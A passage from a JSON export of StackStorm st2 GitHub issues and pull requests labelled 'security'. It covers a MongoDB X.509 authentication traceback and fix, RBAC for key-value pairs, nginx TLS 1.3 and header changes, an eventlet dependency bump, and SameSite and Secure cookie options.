self._command(\r\n    771             sock_info, cmd, slave_okay,\r\n    772             read_preference=read_preference,\r\n    773             session=tmp_session)[\"cursor\"]\r\n    774         return CommandCursor(\r\n    775             coll,\r\n    776             cursor,\r\n    777             sock_info.address,\r\n    778             session=tmp_session,\r\n    779             explicit_session=session is not None)\r\n    780 else:\r\n\r\nFile /opt/stackstorm/virtualenvs/bolt/lib64/python3.8/site-packages/pymongo/database.py:626, in Database._command(self, sock_info, command, slave_ok, value, check, allowable_errors, read_preference, codec_options, write_concern, parse_write_concern_error, session, **kwargs)\r\n    624 command.update(kwargs)\r\n    625 with self.__client._tmp_session(session) as s:\r\n--> 626     return sock_info.command(\r\n    627         self.__name,\r\n    628         command,\r\n    629         slave_ok,\r\n    630         read_preference,\r\n    631         codec_options,\r\n    632         check,\r\n    633         allowable_errors,\r\n    634         write_concern=write_concern,\r\n    635         parse_write_concern_error=parse_write_concern_error,\r\n    636         session=s,\r\n    637         client=self.__client)\r\n\r\nFile /opt/stackstorm/virtualenvs/bolt/lib64/python3.8/site-packages/pymongo/pool.py:683, in SocketInfo.command(self, dbname, spec, slave_ok, read_preference, codec_options, check, allowable_errors, check_keys, read_concern, write_concern, parse_write_concern_error, collation, session, client, retryable_write, publish_events, user_fields, exhaust_allowed)\r\n    681     self._raise_if_not_writable(unacknowledged)\r\n    682 try:\r\n--> 683     return command(self, dbname, spec, slave_ok,\r\n    684                    self.is_mongos, read_preference, codec_options,\r\n    685                    session, client, check, allowable_errors,\r\n    686                    self.address, check_keys, listeners,\r\n    687                    self.max_bson_size, read_concern,\r\n    688                    parse_write_concern_error=parse_write_concern_error,\r\n    689                    collation=collation,\r\n    690                    compression_ctx=self.compression_context,\r\n    691                    use_op_msg=self.op_msg_enabled,\r\n    692                    unacknowledged=unacknowledged,\r\n    693                    user_fields=user_fields,\r\n    694                    exhaust_allowed=exhaust_allowed)\r\n    695 except OperationFailure:\r\n    696     raise\r\n\r\nFile /opt/stackstorm/virtualenvs/bolt/lib64/python3.8/site-packages/pymongo/network.py:159, in command(sock_info, dbname, spec, slave_ok, is_mongos, read_preference, codec_options, session, client, check, allowable_errors, address, check_keys, listeners, max_bson_size, read_concern, parse_write_concern_error, collation, compression_ctx, use_op_msg, unacknowledged, user_fields, exhaust_allowed)\r\n    157             client._process_response(response_doc, session)\r\n    158         if check:\r\n--> 159             helpers._check_command_response(\r\n    160                 response_doc, sock_info.max_wire_version, allowable_errors,\r\n    161                 parse_write_concern_error=parse_write_concern_error)\r\n    162 except Exception as exc:\r\n    163     if publish:\r\n\r\nFile /opt/stackstorm/virtualenvs/bolt/lib64/python3.8/site-packages/pymongo/helpers.py:164, in _check_command_response(response, max_wire_version, allowable_errors, parse_write_concern_error)\r\n    161 elif code == 43:\r\n    162     raise CursorNotFound(errmsg, code, response, max_wire_version)\r\n--> 164 raise OperationFailure(errmsg, code, response, max_wire_version)\r\n\r\nOperationFailure: command listCollections requires authentication, full error: {'ok': 0.0, 'errmsg': 'command listCollections requires authentication', 'code': 13, 'codeName': 'Unauthorized'}\r\n```\r\n\r\nManual code (working):\r\n```\r\nIn [1]: import ssl as ssl_lib\r\n   ...: \r\n   ...: import mongoengine\r\n   ...: import pymongo\r\n   ...: \r\n   ...: ssl_kwargs = {\r\n   ...:     'ssl': True,\r\n   ...:     'tlsCertificateKeyFile': '/etc/st2/mongo_certs/client.pem',\r\n   ...:     'tlsCAFile': '/etc/st2/mongo_certs/ca.pem',\r\n   ...:     'tlsAllowInvalidHostnames': True,\r\n   ...:     'tlsAllowInvalidCertificates': True,\r\n   ...:     'authSource': '$external',\r\n   ...:     'authMechanism': 'MONGODB-X509'\r\n   ...: }\r\n   ...: connection = mongoengine.connection.connect(\r\n   ...:     'st2',\r\n   ...:     host='127.0.0.1',\r\n   ...:     port=27017,\r\n   ...:     tz_aware=True,\r\n   ...:     username=None,\r\n   ...:     password=None,\r\n   ...:     connectTimeoutMS=3000,\r\n   ...:     serverSelectionTimeoutMS=3000,\r\n   ...:     **ssl_kwargs\r\n   ...: )\r\n\r\nIn [2]: connection.admin.command(\"ping\")\r\nOut[2]: {'ok': 1.0}\r\n\r\nIn [3]: test = connection.st2.list_collections()\r\n\r\nIn [4]: list(test)\r\nOut[4]: \r\n[{'name': 'task_execution_d_b',\r\n  'type': 'collection',\r\n  'options': {},\r\n  'info': {'readOnly': False,\r\n   'uuid': UUID('bcd6d2b5-6226-47ef-ac6e-217e30fcca4e')},\r\n  'idIndex': {'v': 2,\r\n   'key': {'_id': 1},\r\n   'name': '_id_',\r\n   'ns': 'st2.task_execution_d_b'}},\r\n   ......\r\n```",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5354",
                "title": "Implementation of RBAC for KeyValuePair",
                "labels": [
                    "feature",
                    "security",
                    "RBAC",
                    "size/XL"
                ],
                "user": "ashwini-orchestral",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5354,
                "id": 992309652,
                "state": "closed",
                "project_created_at": "2021-09-09T14:40:30Z",
                "closed_at": "2021-12-10T17:16:16Z",
                "body": "Implemented RBAC functionality and unit tests for key-value pairs for existing and new permission types. Previously, RBAC feature for key value pairs are not yet implemented.\r\n- Existing permission types - KEY_VALUE_VIEW, KEY_VALUE_SET, KEY_VALUE_DELETE\r\n- New permission types - KEY_VALUE_LIST, KEY_VALUE_ALL\r\n\r\nRBAC is enabled in the st2.conf file. Access to a key value pair is checked in the KeyValuePair API controller.\r\n- SET and DELETE permissions will automatically grant LIST and VIEW permissions.\r\n- By default, user has access to his/her own user scoped KVPs without requiring specific permission grant.\r\n- A non-admin user can be explicitly granted permission to one or more system scoped KVPs.\r\n- A non-admin user cannot access another user's KVPs.\r\n- By default, admin and system_admin has ALL access to system scoped KVPs.\r\n- Admin has full access to another user's KVPs (behavior in current version).\r\n\r\nThis change requires RBAC backend support @ PR https://github.com/StackStorm/st2-rbac-backend/pull/55.",
                "comments": [
                    {
                        "body": "Moving this feature to v3.7.0 to give more time for folks to soak this in.",
                        "user": "m4dcoder",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-10-03T23:07:22Z",
                        "url": "https://github.com/StackStorm/st2/pull/5354#issuecomment-933040720"
                    },
                    {
                        "body": "@ashwini-orchestral The PR needs a Changelog. Please add one.\r\n\r\n@m4dcoder Additionally, do we need documentation changes for this new feature as well?",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-12-09T18:33:48Z",
                        "url": "https://github.com/StackStorm/st2/pull/5354#issuecomment-990116145"
                    },
                    {
                        "body": "@armab Corresponding PR for docs at https://github.com/StackStorm/st2docs/pull/1092",
                        "user": "m4dcoder",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-12-10T17:23:15Z",
                        "url": "https://github.com/StackStorm/st2/pull/5354#issuecomment-991154620"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5354",
                    "merged_at": "2021-12-10T17:16:16Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5298",
                "title": "Changed X-XSS-Protection to follow OWASP standards due to deprecation.",
                "labels": [
                    "security",
                    "size/XS",
                    "nginx"
                ],
                "user": "LiamRiddell",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5298,
                "id": 936252160,
                "state": "closed",
                "project_created_at": "2021-07-03T13:09:03Z",
                "closed_at": "2022-07-19T19:24:44Z",
                "body": "Modified the `conf/nginx/st2.conf` to disable the `X-XSS-Protection` functionality in order to align with the OWASP standards. As most browser vendors have deprecated or removed this feature due to the fact it can introduce additional security issues.  Please view the following sources:\r\n\r\nOWASP:\r\n![image](https://user-images.githubusercontent.com/3812154/124355183-d157b500-dc07-11eb-8ac2-2c513ff1ced1.png)\r\n\r\nMozilla Developer Network Web Docs:\r\n![image](https://user-images.githubusercontent.com/3812154/124355214-f0564700-dc07-11eb-9113-63c064781597.png)\r\n\r\nReferences:\r\nOWASP - https://owasp.org/www-project-secure-headers/#x-xss-protection\r\nMDN - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection\r\n",
                "comments": [
                    {
                        "body": "[![CLA assistant check](https://cla-assistant.io/pull/badge/signed)](https://cla-assistant.io/StackStorm/st2?pullRequest=5298) <br/>All committers have signed the CLA.",
                        "user": "CLAassistant",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-07-03T13:09:08Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-873405933"
                    },
                    {
                        "body": "Seems reasonable to me although it would also be good to check the \"legacy browsers\" list and ensure it's indeed very old version with very little or no usage in real world.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-07-04T09:38:59Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-873555068"
                    },
                    {
                        "body": "Agreed, I believe we could potentially use `Can I Use?` maintained service to get an idea of browser list. \r\nhttps://caniuse.com/mdn-http_headers_x-xss-protection",
                        "user": "LiamRiddell",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-07-04T21:02:46Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-873661871"
                    },
                    {
                        "body": "Do we need to replace X-XSS-Protection with CSP? https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-10-05T21:49:05Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-934895722"
                    },
                    {
                        "body": "@LiamRiddell Would you please add a changelog entry and replace `X-XSS-Protection` with `Content-Security-Policy`?",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-04-01T19:32:57Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-1086256967"
                    },
                    {
                        "body": "@cognifloyd Hi Jacob, apologies. You want me to add a new changelog entry in the \"CHANGELOG.rst\" file in the root directory of the project? Best, Liam.",
                        "user": "LiamRiddell",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-07-19T16:16:11Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-1189281806"
                    },
                    {
                        "body": "Correct",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-07-19T16:21:20Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-1189294633"
                    },
                    {
                        "body": "> Correct\r\n\r\nDo you want me to add it under the \"in development\" change log?\r\n",
                        "user": "LiamRiddell",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-07-19T16:22:03Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-1189296472"
                    },
                    {
                        "body": "Yes. Then when we cut a release, that section gets renamed to the version number and we add a new in development section.",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-07-19T16:23:37Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-1189300244"
                    },
                    {
                        "body": "> Yes. Then when we cut a release, that section gets renamed to the version number and we add a new in development section.\r\n\r\nPerfect, please review the changes. Sorry again for the delay!",
                        "user": "LiamRiddell",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-07-19T16:28:13Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-1189305113"
                    },
                    {
                        "body": "> Do we need to replace X-XSS-Protection with CSP? https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\r\n\r\nYes, if possible that is standard practice to mitigate against XSS. However, in some apps it may not be a simple change as the blast radius of blocking resources based on allow-list could cause issues across the app.",
                        "user": "LiamRiddell",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-07-19T16:35:18Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-1189312316"
                    },
                    {
                        "body": "I'm not sure why CircleCI isn't running this PR. I'm going to close and reopen to trigger it (hopefully)",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-07-19T19:13:42Z",
                        "url": "https://github.com/StackStorm/st2/pull/5298#issuecomment-1189458350"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5298",
                    "merged_at": "2022-07-19T19:24:44Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5280",
                "title": "Update nginx config to support TLS v1.3 in addition to TLS v1.2",
                "labels": [
                    "security",
                    "size/S",
                    "nginx"
                ],
                "user": "Kami",
                "issue_author_association": "MEMBER",
                "number": 5280,
                "id": 910353449,
                "state": "closed",
                "project_created_at": "2021-06-03T10:28:23Z",
                "closed_at": "2021-06-11T19:53:28Z",
                "body": "This pull request updates production + sample nginx configs to also support TLS v1.3 in addition to TLS v1.2.\r\n\r\nKeep in mind that TLS v1.3 will only be used if the server and client support it. On the server side, this means it will work out of the box on more recent distros where nginx version is >= v1.13 and nginx is compiled against OpenSSL v 1.1.1 which supports TLS v1.3.\r\n\r\nResolves #5216.",
                "comments": [
                    {
                        "body": "Thinking that this user-affecting change probably worth a small note in the upcoming Release Announcement",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-03T11:02:34Z",
                        "url": "https://github.com/StackStorm/st2/pull/5280#issuecomment-853784090"
                    },
                    {
                        "body": "Do we also need a small remark in the https://docs.stackstorm.com/upgrade_notes.html ?",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-03T11:03:32Z",
                        "url": "https://github.com/StackStorm/st2/pull/5280#issuecomment-853784618"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5280",
                    "merged_at": "2021-06-11T19:53:28Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5257",
                "title": "Bump eventlet from 0.30.2 to 0.31.0",
                "labels": [
                    "bug",
                    "security",
                    "external dependency",
                    "size/M"
                ],
                "user": "dependabot[bot]",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5257,
                "id": 881037195,
                "state": "closed",
                "project_created_at": "2021-05-08T16:43:29Z",
                "closed_at": "2023-11-27T12:29:32Z",
                "body": "Bumps [eventlet](https://github.com/eventlet/eventlet) from 0.30.2 to 0.31.0.\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"https://github.com/eventlet/eventlet/blob/master/NEWS\">eventlet's changelog</a>.</em></p>\n<blockquote>\n<h1>0.31.0</h1>\n<ul>\n<li>IMPORTANT: websocket: Limit maximum uncompressed frame length to 8MiB <a href=\"https://github.com/eventlet/eventlet/security/advisories/GHSA-9p9m-jm8w-94p2\">https://github.com/eventlet/eventlet/security/advisories/GHSA-9p9m-jm8w-94p2</a></li>\n</ul>\n<h1>0.30.3</h1>\n<ul>\n<li>wsgi: websocket ALREADY_HANDLED flag on corolocal</li>\n<li>green.ssl: Set suppress_ragged_eofs default based on SSLSocket defaults</li>\n<li>greenio: socket.connect_ex returned None instead of 0 on success</li>\n<li>Use _imp instead of deprecated imp</li>\n</ul>\n</blockquote>\n</details>\n<details>\n<summary>Commits</summary>\n<ul>\n<li><a href=\"https://github.com/eventlet/eventlet/commit/f717f382d0bfb5cf084a9e69737fa6dfcb2eb5cf\"><code>f717f38</code></a> v0.31.0 release</li>\n<li><a href=\"https://github.com/eventlet/eventlet/commit/1412f5e4125b4313f815778a1acb4d3336efcd07\"><code>1412f5e</code></a> websocket: Limit maximum uncompressed frame length to 8MiB</li>\n<li><a href=\"https://github.com/eventlet/eventlet/commit/b0be94ef38a621ba5cb8ae3421d7367fc13ddae2\"><code>b0be94e</code></a> v0.30.3 release</li>\n<li><a href=\"https://github.com/eventlet/eventlet/commit/df0bc00c3b758b0a632929a7ade2125d0a80c08a\"><code>df0bc00</code></a> wsgi: websocket ALREADY_HANDLED flag on corolocal</li>\n<li><a href=\"https://github.com/eventlet/eventlet/commit/377b4fb39cc59273bd5ff461eb0388e3c3dffdb3\"><code>377b4fb</code></a> green.ssl: Set suppress_ragged_eofs default based on SSLSocket defaults</li>\n<li><a href=\"https://github.com/eventlet/eventlet/commit/71b76bfc5166050dc333c72ead6b51a8933061e7\"><code>71b76bf</code></a> Security Policy</li>\n<li><a href=\"https://github.com/eventlet/eventlet/commit/50441fc1563b85a275ea9937208909ade9907eb3\"><code>50441fc</code></a> greenio: socket.connect_ex returned None instead of 0 on success</li>\n<li><a href=\"https://github.com/eventlet/eventlet/commit/e16fcab6019f97db2639ce970dc0cf9546114921\"><code>e16fcab</code></a> Use _imp instead of deprecated imp</li>\n<li>See full diff in <a href=\"https://github.com/eventlet/eventlet/compare/v0.30.2...v0.31.0\">compare view</a></li>\n</ul>\n</details>\n<br />\n\n\n[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=eventlet&package-manager=pip&previous-version=0.30.2&new-version=0.31.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)\n\nYou can trigger a rebase of this PR by commenting `@dependabot rebase`.\n\n[//]: # (dependabot-automerge-start)\n[//]: # (dependabot-automerge-end)\n\n---\n\n<details>\n<summary>Dependabot commands and options</summary>\n<br />\n\nYou can trigger Dependabot actions by commenting on this PR:\n- `@dependabot rebase` will rebase this PR\n- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it\n- `@dependabot merge` will merge this PR after your CI passes on it\n- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it\n- `@dependabot cancel merge` will cancel a previously requested merge and block automerging\n- `@dependabot reopen` will reopen this PR if it is closed\n- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually\n- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language\n- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language\n- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language\n- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language\n\nYou can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/StackStorm/st2/network/alerts).\n\n</details>\n\n> **Note**\n> Automatic rebases have been disabled on this pull request as it has been open for over 30 days.\n",
                "comments": [
                    {
                        "body": "Based on history, we tried to update the `eventlet` before here: https://github.com/StackStorm/st2/pull/5255#issuecomment-835861160 by @Kami \r\n\r\nHowever, because of the breaking change, it fails the build in `guinicorn` which relies on specific `eventlet` functionality.\r\n\r\n* https://github.com/eventlet/eventlet/issues/702\r\n* https://github.com/benoitc/gunicorn/pull/2581\r\n* https://stackoverflow.com/a/67429430/4533625\r\n\r\nPer https://github.com/eventlet/eventlet/issues/702#issuecomment-833432067, the proper fix in `gunicorn` was merged, but the new version wasn't released yet.\r\n\r\nSo the current status is that we're waiting for the `guinicorn` version to be released here: https://github.com/benoitc/gunicorn/releases (newer than 20.1.0) and so we can update both `eventlent` + `gunicorn` in this PR to merge it.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-08-11T18:39:57Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-897061081"
                    },
                    {
                        "body": "[![CLA assistant check](https://cla-assistant.io/pull/badge/signed)](https://cla-assistant.io/StackStorm/st2?pullRequest=5257) <br/>All committers have signed the CLA.",
                        "user": "CLAassistant",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-08-29T11:09:25Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-907773484"
                    },
                    {
                        "body": "Update on gunicorn 7 days ago, saying new release would be out this week: https://github.com/benoitc/gunicorn/issues/2638",
                        "user": "amanda11",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-09-07T16:39:16Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-914458638"
                    },
                    {
                        "body": "Looks like https://github.com/benoitc/gunicorn/issues/2638 is still unreleased.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-10-01T13:45:12Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-932242486"
                    },
                    {
                        "body": "@armab Shall we move this to 3.7.0?",
                        "user": "amanda11",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-10-01T15:11:29Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-932316064"
                    },
                    {
                        "body": "Yeah. 1 week has become 1 month, and they have only merged 1 PR in that time. That PR has nothing to do with the release (afaict), so who knows when it will happen. I moved this to 3.7.0",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-10-02T07:04:33Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-932697636"
                    },
                    {
                        "body": "No new release - latest is still 20.1.0 - but project still active. 6 open issues in the next release plan - https://github.com/benoitc/gunicorn/milestone/20.",
                        "user": "amanda11",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-03-04T09:54:20Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1059010736"
                    },
                    {
                        "body": "Thanks for checking!\r\nWe have no choice, but to move the issue to the next v3.8.0 and keep track of it.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-03-05T12:09:41Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1059752019"
                    },
                    {
                        "body": "More than 1 year later and still no gunicorn 21 release.  Eventlet is now at 0.33.0 which makes this PR obsolete.",
                        "user": "nzlosh",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-09-14T06:18:10Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1246293608"
                    },
                    {
                        "body": "What are peoples opinion on the idea of forking gunicorn and building v3.8 from our forked repo that includes that patch we need to move past eventlet 0.30.2?",
                        "user": "nzlosh",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-09-14T21:14:56Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1247309888"
                    },
                    {
                        "body": "I think it is on their master branch, so let's try targeting a git commit and avoid actually forking it.\n\nThey keep saying something about some CI infrastructure change, but they have not expounded. And there's no movement on releasing. So I don't see what else we can do.",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-09-14T21:57:09Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1247341814"
                    },
                    {
                        "body": "OK, we'll start without forking and see if we encounter other issues related to gunicron that require us to accumulate patches in a forked repo.",
                        "user": "nzlosh",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-09-15T08:09:56Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1247739291"
                    },
                    {
                        "body": "gunicorn 21 was released in July",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-09-03T17:37:30Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1704360394"
                    },
                    {
                        "body": "#6061 bumped eventlet to `0.33.3` - so I think this PR can be abandon as its been superseded now?",
                        "user": "jk464",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-11-27T12:02:01Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1827699883"
                    },
                    {
                        "body": "Thanks @jk464 for bumping this thread.\r\nClosing.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-11-27T12:29:32Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1827744294"
                    },
                    {
                        "body": "OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`.\n\nIf you change your mind, just re-open this PR and I'll resolve any conflicts on it.",
                        "user": "dependabot[bot]",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-11-27T12:29:35Z",
                        "url": "https://github.com/StackStorm/st2/pull/5257#issuecomment-1827744371"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5257",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/5248",
                "title": "Add support for setting SameSite and Secure attribute for auth cookie we set",
                "labels": [
                    "security",
                    "size/L",
                    "service: api"
                ],
                "user": "Kami",
                "issue_author_association": "MEMBER",
                "number": 5248,
                "id": 865534640,
                "state": "closed",
                "project_created_at": "2021-04-22T22:19:33Z",
                "closed_at": "2022-03-27T10:41:16Z",
                "body": "This pull request includes a small \"security hardening\" change.\r\n\r\nIt allows operator to configure value for ``SameSite`` attribute (https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite, https://web.dev/samesite-cookies-explained/) which is set with the ``auth-token`` cookie we set in some situations (e.g. when authenticating via st2web and similar).\r\n\r\nThe value defaults to ``Lax`` which should work as a good secure default (defining it to Strict may break some in some situations, see the link above).\r\n\r\n## TODO\r\n\r\n- [x] Unit tests\r\n- [x] Improve config option help string\r\n- [x] Upgrade notes entry - https://github.com/StackStorm/st2docs/pull/1070\r\n- [ ] Perhaps a st2docs page on various \"best security practices\" for deployments? (not necessary blocker for this PR)",
                "comments": [
                    {
                        "body": "I noticed we also don't set ``secure`` flag for the cookie.\r\n\r\nI will also add an option for that and default it to True since it's a best security practice.\r\n\r\nIn case someone doesn't run StackStorm over https (bad idea), they will need to set it to False. I will open st2docs upgrade notes entry which documents how to do that.\r\n\r\nAlso keep in mind that this cookie is pretty much only used when logging via token / api key in query parameters (which pretty much only means st2web for our official stuff).",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-04-23T12:38:49Z",
                        "url": "https://github.com/StackStorm/st2/pull/5248#issuecomment-825629488"
                    },
                    {
                        "body": "[![CLA assistant check](https://cla-assistant.io/pull/badge/signed)](https://cla-assistant.io/StackStorm/st2?pullRequest=5248) <br/>All committers have signed the CLA.",
                        "user": "CLAassistant",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-09-06T14:18:11Z",
                        "url": "https://github.com/StackStorm/st2/pull/5248#issuecomment-913685235"
                    },
                    {
                        "body": "@cognifloyd I pushed a change which renames ``None`` to ``unset`` (which I also think it's better).\r\n\r\nHopefully CI and tests will pass since my local dev environment is totally toast and I don't have multiple hours to spend to try to fix it at this point.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-11-11T12:45:50Z",
                        "url": "https://github.com/StackStorm/st2/pull/5248#issuecomment-966273764"
                    },
                    {
                        "body": "Now that v3.6.0 merge freeze is over, I will go ahead and merge it into master.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-03-27T10:41:04Z",
                        "url": "https://github.com/StackStorm/st2/pull/5248#issuecomment-1079902498"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/5248",
                    "merged_at": "2022-03-27T10:41:16Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5216",
                "title": "Enable TLS v1.3 support in the default nginx config",
                "labels": [
                    "enhancement",
                    "security"
                ],
                "user": "Kami",
                "issue_author_association": "MEMBER",
                "number": 5216,
                "id": 848772157,
                "state": "closed",
                "project_created_at": "2021-04-01T20:36:47Z",
                "closed_at": "2021-06-11T19:53:28Z",
                "body": "We should update nginx config to support TLS v1.3 in addition to TLS v1.2.\r\n\r\nSince we still support Ubuntu 16.04, we can't do that easily for the installer (we could make it worth, but it's not the effort and complexity at this point), but we should at least do it for the docker setup (via nginx config patch) to begin with.\r\n\r\nThat image and nginx version should work just fine with TLS v1.3.",
                "comments": [
                    {
                        "body": "I believe the target is to deprecate Ubuntu 16.04 LTS after Adding Ubuntu 20.04 LTS.\r\nIf that happens in `v3.5.0`, the TLS change could be done directly in the [st2 nginx conf](https://github.com/StackStorm/st2/blob/master/conf/nginx/st2.conf).",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-04-01T20:43:41Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-812161293"
                    },
                    {
                        "body": "Yeah, that would be ideal. The less places and patches we need to maintain the better.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-04-02T16:30:15Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-812603895"
                    },
                    {
                        "body": "@amanda11 @armab @Kami So our agreed upon outcome is the st2.conf file that defaults to TLS 1.3, and a note in the docs that explains that one `can` change it back to TLS v1.2? ",
                        "user": "punkrokk",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-06-01T17:55:02Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-852330328"
                    },
                    {
                        "body": "@punkrokk That's my understanding, but I've not been involved on the discussions prior to this.",
                        "user": "amanda11",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2021-06-01T18:50:56Z",
                        "url": "https://github.com/StackStorm/st2/issues/5216#issuecomment-852364298"
                    },
                    {
